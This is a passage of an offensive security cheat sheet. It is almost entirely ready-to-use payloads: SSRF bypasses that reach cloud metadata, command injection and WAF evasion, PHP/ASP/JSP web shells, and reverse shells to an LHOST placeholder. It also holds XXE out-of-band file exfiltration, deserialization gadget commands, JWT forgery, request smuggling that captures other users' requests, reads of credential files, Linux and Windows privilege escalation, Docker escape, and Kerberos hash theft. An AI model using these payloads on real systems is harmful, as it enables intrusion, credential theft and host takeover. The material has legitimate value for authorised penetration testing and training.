http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Header required: Metadata: true
```

#### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/id
```

#### Oracle Cloud
```
http://169.254.169.254/opc/v1/
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/vnics/
http://169.254.169.254/opc/v1/instance/metadata/
```

#### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/user-data/
```

### SSRF Bypass — Alternative IP Formats

#### Decimal
```
http://2130706433/       # 127.0.0.1
http://3232235521/       # 192.168.0.1
http://2852039166/       # 169.254.169.254
```

#### Hex
```
http://0x7f000001/       # 127.0.0.1
http://0xc0a80001/       # 192.168.1.1
http://0xa9fea9fe/       # 169.254.169.254
```

#### Octal
```
http://0177.0.0.1/       # 127.0.0.1
http://0o177.0.0.1/      # 127.0.0.1
```

#### IPv6 Variants
```
http://[::]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]
```

#### CIDR Range Bypass
```
http://127.127.127.127/
http://127.0.1.3/
http://127.0.0.0/
```

#### Rare Address Shortcuts
```
http://0/                 # 0.0.0.0
http://127.1              # 127.0.0.1
http://127.0.1            # 127.0.0.1
```

#### URL Parser Confusion
```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

### SSRF Bypass — DNS Rebinding
```
# 1u.ms service
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms

# nip.io
127.0.0.1.nip.io
anything.169.254.169.254.nip.io
```

### SSRF Bypass — Domain Redirects
```
http://localtest.me          # → ::1
http://localh.st             # → 127.0.0.1
http://spoofed.YOUR-COLLABORATOR  # → 127.0.0.1
```

### SSRF Bypass — Redirect Services
```
https://307.r3dir.me/--to/?url=http://localhost
https://302.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/
```

### Curl URL Globbing (Path Traversal via SSRF)
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```

### HTML-to-PDF SSRF Gadgets
```html
<html><body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body></html>
```

### Misconfigured Proxy SSRF
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```

---

## COMMAND INJECTION

### Chain Operators
```bash
; id
| id
|| id
&& id
& id
%0a id
```

### Blind Time-Based
```bash
; sleep 5
|| sleep 5
&& sleep 5
| sleep 5
%0a sleep 5
` sleep 5 `
$( sleep 5 )
```

### Blind OOB (DNS)
```bash
; nslookup $(whoami).LHOST
|| nslookup $(whoami).LHOST
| nslookup $(whoami).LHOST
```

### Redirect Output
```bash
; ls > /var/www/images/output.txt
; cat /etc/passwd > /var/www/images/passwd.txt
```

### WAF Bypass — No Spaces
```bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
sh</dev/tcp/LHOST/LPORT
;ls%09-al%09/home
X=$'cat\x20/etc/passwd'&&$X
```

### WAF Bypass — Slash Filter
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### WAF Bypass — Hex Encoding
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
xxd -r -p <<< 2f6574632f706173737764
```

### WAF Bypass — Single Quotes
```bash
w'h'o'am'i
wh''oami
'c'a't /e't'c/pa's's'w'd
```

### WAF Bypass — Double Quotes
```bash
w"h"o"am"i
c"a"t /e"t"c/pa"s"swd
```

### WAF Bypass — Backticks / Substitution
```bash
who`echo a`mi
who$()ami
cat `echo /etc/passwd`
cat $(echo /etc/passwd)
```

### WAF Bypass — Newlines
```bash
original_cmd_by_server
cat /etc/passwd
```

### WAF Bypass — Backslash Newline
```bash
cat /et\
c/pa\
sswd
# URL: cat%20/et%5C%0Ac/pa%5C%0Asswd
```

### WAF Bypass — Wildcards
```bash
cat /etc/pass*
cat /etc/pas?wd
cat /???/????wd
/?s?/??t /e??/pa??wd
```

### WAF Bypass — Tilde / Brace Expansion
```bash
{,ip,a}
{,ifconfig}
{l,-lh}s
{,/?s?/?i?/c?t,/e??/p??s??,}
```

### Polyglot Command Injection
```bash
# Works in bash, Windows cmd, PowerShell
|| ls
|| echo 1 && echo 2
```

### Argument Injection — SSH
```bash
ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
```

### Argument Injection — curl (write webshell)
```bash
curl http://LHOST/shell.php -o webshell.php
```

### Inside Command — Backticks
```bash
original_cmd_by_server `cat /etc/passwd`
```

### Inside Command — $()
```bash
original_cmd_by_server $(cat /etc/passwd)
```

### Windows Command Injection
```cmd
| dir
& dir
&& whoami
|| whoami
%0d%0a whoami
```

---

## FILE UPLOAD

### PHP Web Shells
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>
<?=`$_GET[0]`?>
<?=shell_exec('id')?>
<?php passthru($_GET['cmd']); ?>
<?=`$_POST[0]`?>
<script language="php">system('id');</script>
```

### PHP Reverse Shell
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"); ?>
<?php system("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"); ?>
```

### ASP Shells
```asp
<% eval request("cmd") %>
<% Set o = Server.CreateObject("WSCRIPT.SHELL"): o.Run("cmd.exe /c " & Request("cmd")) %>
<% Response.Write(CreateObject("WScript.Shell").Exec("cmd.exe /c whoami").StdOut.ReadAll()) %>
```

### JSP Shell
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
```

### Extension Bypass List
```
shell.php.jpg
shell.php%00.jpg
shell.php%20
shell.php.
shell.pHp
shell.pHP5
shell.php::$data
shell.php.....
shell.asp;.jpg
shell.php%0d%0a.jpg
shell.php%0a
shell.%E2%80%AEphp.jpg  # RTLO becomes shell.gpj.php
shell.php/
shell.php.\
shell.j\sp
shell.j/sp
```

### All PHP Extensions to Try
```
.php .php3 .php4 .php5 .php7 .pht .phps .phar .phpt .pgif .phtml .phtm .inc
```

### All ASP Extensions
```
.asp .aspx .config .cer .asa .soap
shell.aspx;1.jpg  # IIS < 7.0
```

### JSP Extensions
```
.jsp .jspx .jsw .jsv .jspf .wss .do .actions
```

### MIME Spoofing
```
Content-Type: image/gif
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: text/php
Content-Type: application/x-httpd-php
```

### Magic Bytes
```
GIF: GIF89a;   or GIF87a
PNG: \x89PNG\r\n\x1a\n
JPG: \xff\xd8\xff
```

### GIF + PHP Polyglot
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

### EXIF Injection
```bash
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg
exiftool -Comment="<?php echo 'Command:'; if(\$_POST){system(\$_POST['cmd']);} __halt_compiler();" img.jpg
```

### .htaccess Upload (Apache)
```
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg

# Self-containing .htaccess
AddType application/x-httpd-php .htaccess
# SHELL <?php system($_GET['c']); ?>
```

### web.config Upload (IIS)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="jpg_as_asp" path="*.jpg" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

### uwsgi.ini Upload
```ini
[uwsgi]
body = @(exec://whoami)
```

### package.json Script
```json
{"scripts": {"prepare": "/bin/touch /tmp/pwned.txt"}}
```

### composer.json Script
```json
{"scripts": {"pre-command-run": ["/bin/touch /tmp/pwned.txt"]}}
```

### Python .pth File (dropped in site-packages)
```python
import os;os.system("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'")
```

---

## XXE PAYLOADS

### Classic XXE — File Read
```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

### XXE — Windows File Read
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>
```

### XXE — PHP Filter Wrapper
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts><contact><name>Jean &xxe; Dupont</name></contact></contacts>
```

### XXE — Base64 Encoded File
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### XInclude Attack (no DOCTYPE control)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### XXE — SSRF
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

### XXE — DoS (Billion Laughs)
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### XXE — Parameters Laugh Attack
```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

### XXE — OOB Data Exfiltration

**DTD hosted on attacker server (evil.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://LHOST/?x=%file;'>">
%eval;
%exfil;
```

**XXE payload referencing DTD:**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://LHOST/evil.dtd"> %xxe;]>
```

### XXE — Error-Based (Local DTD, Linux)
```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

### XXE — Error-Based (Local DTD, Windows)
```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>anything</xxx>
```

### XXE — SVG File
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<text font-size="20" x="0" y="16">&xxe;</text>
</svg>
```

### XXE — JSON Endpoints (Content-Type Spoof)
```
Content-Type: application/json → application/xml
{"search":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}
```

---

## DESERIALIZATION

### PHP — Serialized Format Examples
```
O:6:"MyClass":2:{s:3:"cmd";s:2:"id";s:4:"test";s:1:"x";}
a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}
```

### PHP — PHPGGC Commands
```bash
# Generate payloads:
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 system id
phpggc Monolog/RCE1 system id
phpggc Guzzle/RCE1 system id
phpggc SwiftMailer/FW1 system id
phpggc -b Laravel/RCE1 system 'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"'

# PHAR deserialization:
phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

### Java — ysoserial Commands
```bash
# Common gadget chains:
java -jar ysoserial.jar CommonsCollections1 'id'
java -jar ysoserial.jar CommonsCollections5 'wget http://LHOST/shell.sh -O /tmp/shell.sh'
java -jar ysoserial.jar CommonsBeanutils1 'nc LHOST LPORT -e /bin/sh'
java -jar ysoserial.jar Jdk7u21 'curl http://LHOST/'
java -jar ysoserial.jar URLDNS 'http://LHOST'
java -jar ysoserial.jar Spring1 'bash -c {echo,BASE64_REV_SHELL}|{base64,-d}|{bash,-i}'
```

### .NET — ysoserial.net Commands
```powershell
# Common formatters:
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd.exe /c calc.exe"
ysoserial.exe -f LosFormatter -g ActivitySurrogateSelector -c "cmd /c whoami"
ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "powershell -e BASE64"
ysoserial.exe -f ObjectStateFormatter -g TypeConfuseDelegate -c "cmd /c ping LHOST"
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c powershell BASE64_REV_SHELL"
```

### Python — Pickle RCE
```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

### Python — PyYAML RCE
```yaml
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]
!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval ["__import__('os').system('id')"]]]
```

### Ruby — Marshal RCE (Universal Gadget)
```ruby
# Universal RCE gadget (Ruby 2.x)
require 'base64'
# ERB-based
payload = "\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\x0e@instanceo:\bERB\b:\t@srcI\"\x1f`id`\x06:\x06ET:\f@method:\vresult:\x10@deprecatoro:\x1fActiveSupport::Deprecation\x00"
puts Base64.strict_encode64(payload)
```

### NodeJS — Deserialization RCE
```javascript
// node-serialize RCE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(error, stdout, stderr){console.log(stdout)});}"}

// js-yaml RCE
var yaml = require('js-yaml');
yaml.load('test: !!js/function >\n  - toString\n  - "return process.mainModule.require(\'child_process\').execSync(\'id\').toString()"');
```

### Serialized Object Headers (for detection)
```
.NET ViewState Header:  /w   (Base64 start: FF 01)
BinaryFormatter:        AAEAAAD (Hex: 0001 0000 00FF FFFF FF01)
Java Serialized:        rO   (Hex: AC ED)
PHP Serialized:         Tz   (Hex: 4F 3A) — Prefixes: O:, a:, s:, i:, b:
Python Pickle:          gASV  (Hex: 80 04 95) — Text opcodes: (lp0, S'Test'
Ruby Marshal:           BAgK  (Hex: 04 08)
```

---

## JWT ATTACKS

### alg=none Attack
```bash
# Using jwt_tool:
python3 jwt_tool.py JWT_HERE -X a

# Manual Python:
python3 -c "import jwt;print(jwt.encode({'sub':'admin','admin':True},'',algorithm='none'))"
```

### Key Confusion (RS256 → HS256)
```bash
# Extract public key from TLS:
openssl s_client -connect example.com:443 2>&1 | openssl x509 -pubkey -noout > pub.pem

# Sign with public key as HMAC secret:
python3 jwt_tool.py JWT_HERE -X k -pk pub.pem

# Manual:
python3 -c "import jwt;print(jwt.encode({'sub':'admin'},key=open('pub.pem').read(),algorithm='HS256'))"
```

### Key Injection (Embedded JWK)
```bash
python3 jwt_tool.py JWT_HERE -X i
```

### Null Signature Attack (CVE-2020-28042)
```bash
python3 jwt_tool.py JWT_HERE -X n
# Or just strip everything after the second dot: 
# eyJhbG....eyJzdWIi.... (no signature)
```

### jku Header Injection
```json
{
  "alg": "RS256",
  "jku": "http://LHOST/jwks.json",
  "kid": "attacker-key"
}
```
Host a JWK Set at `http://LHOST/jwks.json` with attacker-controlled public key.

### kid Header — Path Traversal
```json
{"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"}
```
If the server reads the key from the file indicated by `kid`, this can point to known/empty files.

### kid Header — SQL Injection
```json
{"alg": "HS256", "kid": "x' UNION SELECT 'attacker_secret'--"}
```

### Secret Cracking
```bash
# jwt_tool:
python3 jwt_tool.py JWT_HERE -C -d /usr/share/wordlists/rockyou.txt

# hashcat:
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### Recover Public Key from Two JWTs
```bash
docker run -it ttervoort/jws2pubkey "JWT1" "JWT2"
```

---

## HTTP REQUEST SMUGGLING

### CL.TE Payload
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL Payload
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0
```

### TE.TE Obfuscation Headers
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### CL.0 Payload
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

### Forcing via Hop-by-Hop Headers
```http
Connection: Content-Length
```

### HTTP/2 Request Smuggling
```http
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

### Client-Side Desync
```javascript
fetch('https://www.example.com/', {
    method: 'POST',
    body: "GET / HTTP/1.1\r\nHost: www.example.com",
    mode: 'no-cors',
    credentials: 'include'
})
```

### CL.TE Detection (Timing)
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

### TE.CL Detection (Timing)
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

### Circumventing Front-End Security (CL.TE to /admin)
```http
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Content-Length: 67
Connection: keep-alive
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```

### Capturing Other Users' Requests
```http
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: [redacted].web-security-academy.net
Content-Length: 659

csrf=token&postId=1&name=stolen&email=a@a.com&website=&comment=
```

---

## LFI / PATH TRAVERSAL

### Basic Traversal Sequences
```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
```

### Filter Bypass Sequences
```
....//....//etc/passwd           # Stripped once → ../
..\../etc/passwd
/..%5c../etc/passwd
..%252f..%252f..%252fetc/passwd  # Double decode
..././..././etc/passwd
..///////..////..//////etc/passwd
/%5C../%5C../%5C../%5C../%5C../etc/passwd
..;/
```

### Encoding Variants
```
# URL Encoding
%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL Encoding
%252e%252e%252fetc%252fpasswd

# Unicode
%uff0e%uff0e%u2215etc%u2215passwd

# Overlong UTF-8
%c0%ae%c0%ae%c0%afetc%c0%afpasswd
```

### Null Byte (PHP < 5.3.4)
```
../../../etc/passwd%00
../../../etc/passwd\0
```

### PHP Wrappers
```
# Read source code
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=/etc/passwd

# Command execution (if expect:// enabled)
expect://id
expect://whoami

# Data wrapper
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b

# Input wrapper (POST body)
php://input    # POST: <?php system('id'); ?>

# Zip wrapper
zip://path/to/uploaded.zip%23shell.php
```

### PHP RFI (if allow_url_include=On)
```
http://LHOST/shell.txt
http://LHOST/shell.txt%00
http:%252f%252fLHOST%252fshell.txt
\\LHOST\share\shell.php   # Windows SMB
```

### Log Poisoning — Apache Access Log
```bash
# Inject PHP into User-Agent:
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target/page
# Then LFI: /var/log/apache2/access.log?cmd=id
```

### Log Poisoning — SSH Auth Log
```bash
ssh "<?php system(\$_GET['cmd']); ?>"@target
# Then LFI: /var/log/auth.log?cmd=id
```

### Log Poisoning — Email Log
Send email to local user with PHP in subject.

### Windows File Paths to Target
```
/windows/win.ini
/windows/system32/drivers/etc/hosts
/boot.ini
/Windows/debug/NetSetup.log
/WINDOWS/Repair/SAM
```

### Linux File Paths to Target
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/mysql/my.cnf
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/proc/self/environ
/proc/self/cmdline
/proc/version
/etc/issue
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/proc/net/tcp
/proc/net/udp
/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount
```

---

## LINUX PRIVESC

### Quick Enumeration (First 60 Seconds)
```bash
id; sudo -l 2>/dev/null; uname -a; cat /etc/os-release
echo $PATH; env 2>/dev/null | grep -v LS_COLORS
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys\|/snap"
cat /etc/crontab; ls -la /etc/cron*; crontab -l
ss -tlnp; ps aux | grep root
cat /etc/fstab; mount | grep -v "snap\|cgroup"
find / -name "*.key" -o -name "*.pem" -o -name "*id_rsa*" 2>/dev/null | head -20
```

### SUID Exploitation
```bash
# Find SUID binaries:
find / -perm -4000 -type f 2>/dev/null

# GTFOBins lookup per binary. Common:
# bash SUID:  bash -p
# find SUID:  find . -exec /bin/sh -p \; -quit
# vim SUID:   vim -c ':!/bin/sh'
# less SUID:  less /etc/passwd → !/bin/sh
# awk SUID:   awk 'BEGIN {system("/bin/sh")}'
# python SUID: python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### Capabilities
```bash
# Find:
getcap -r / 2>/dev/null

# CAP_SETUID:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'

# CAP_DAC_READ_SEARCH:
python3 -c 'print(open("/etc/shadow","r").read())'
tar -czf /tmp/shadow.tar.gz /etc/shadow

# CAP_DAC_OVERRIDE:
python3 -c 'open("/etc/sudoers","a").write("user ALL=(ALL) NOPASSWD:ALL\n")'

# CAP_SYS_ADMIN (mount):
python3 -c 'from ctypes import *; libc=CDLL("libc.so.6"); libc.mount.argtypes=(c_char_p,c_char_p,c_char_p,c_ulong,c_char_p); libc.mount(b"/tmp/fake_passwd",b"/etc/passwd",b"none",4096,b"rw")'
```

### Sudo Bypasses
```bash
# CVE-2025-32463 (--chroot):
sudo --chroot / /bin/bash

# Sudo uid bypass:
sudo -u#-1 /bin/bash

# Sudo wildcard:
sudo tar -cf /dev/null /home/user/* --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Known sudo binaries:
sudo vim -c ':!/bin/sh'
sudo less /etc/passwd → !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \;
sudo nmap --interactive → !sh
sudo python -c 'import os;os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'
```

### Kernel Exploits
```bash
# DirtyCow (CVE-2016-5195)
# OverlayFS (CVE-2021-3493)
# PwnKit (CVE-2021-4034)
# DirtyPipe (CVE-2022-0847)
# GameOver(lay) (CVE-2023-2640, CVE-2023-32629)
# StackRot (CVE-2023-3269)
# Use linux-exploit-suggester:
./linux-exploit-suggester.sh
```

### Cron Job Hijack
```bash
# Find writable cron scripts:
grep -R "PATH=" /etc/crontab /etc/cron* 2>/dev/null
ls -la /etc/cron* 2>/dev/null
find /etc/cron* -writable -type f 2>/dev/null

# Inject reverse shell:
echo 'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"' >> /path/to/writable/cron/script
```

### Writable /etc/passwd
```bash
# Generate password hash:
openssl passwd -1 -salt abc password

# Append root user:
echo 'hacker:$1$abc$HASH_HERE:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### Writable /etc/sudoers
```bash
echo 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
sudo -i
```

### LD_PRELOAD Hijack
```c
// compile: gcc -shared -fPIC -o /tmp/preload.so preload.c -nostartfiles
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'");
}
```
```bash
sudo LD_PRELOAD=/tmp/preload.so /bin/bash
```

### NFS no_root_squash
```bash
# Mount remote NFS share:
mkdir /tmp/nfs; mount -t nfs TARGET:/ /tmp/nfs -o nolock

# Create setuid binary on share:
cp /bin/bash /tmp/nfs/bash; chmod +s /tmp/nfs/bash

# Execute on target:
/tmp/nfs/bash -p
```

### Docker Escape
```bash
# Privileged container:
mount /dev/sda /mnt; chroot /mnt /bin/bash

# Docker socket mounted:
docker -H unix:///host/var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash

# SYS_ADMIN capability:
mkdir /tmp/cgrp; mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Chroot Escape
```bash
mkdir chroot-dir; chroot chroot-dir
for i in $(seq 1000); do cd ..; done; chroot .; /bin/bash

# Python one-liner:
python3 -c 'import os;os.mkdir("x");os.chroot("x");[os.chdir("..") for _ in range(1000)];os.chroot(".");os.system("/bin/bash")'
```

### Builtin-Only RCE (no external commands)
```bash
PATH="/bin" /bin/ls; export PATH="/bin"
read aaa; exec $aaa
while read -r line; do echo $line; done < /etc/passwd
```

---

## WINDOWS PRIVESC (Key Payloads)

### Service Binary Hijack
```powershell
# Find services with unquoted paths:
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v "\""

# Check writable service binary:
icacls "C:\Program Files\Vulnerable Service\service.exe"
```

### Token Impersonation (Potato Family)
```powershell
# JuicyPotato:
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

# PrintSpoofer:
PrintSpoofer.exe -c "cmd.exe /c whoami"

# RoguePotato:
RoguePotato.exe -r LHOST -e "cmd.exe /c whoami" -l 9999
```

### UAC Bypass
```powershell
# Fodhelper:
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe /c start cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe

# ComputerDefaults:
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "powershell -e BASE64_REV_SHELL" /f
ComputerDefaults.exe
```

### DLL Hijack
Place malicious DLL named after a missing DLL in a writable path that gets loaded by a privileged process.

---

## ACTIVE DIRECTORY / KERBEROS

### ASREPRoast
```bash
# Find users without Kerberos pre-authentication:
python3 GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP -request
python3 GetNPUsers.py domain.local/user:password -request

# Crack hash:
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### Kerberoasting
```bash
# Enumerate SPNs:
python3 GetUserSPNs.py domain.local/user:password -dc-ip DC_IP

# Request TGS:
python3 GetUserSPNs.py domain.local/user:password -request -dc-ip DC_IP
python3 GetUserSPNs.py domain.local/user:password -request -outputfile kerberoast.hashes

# Crack:
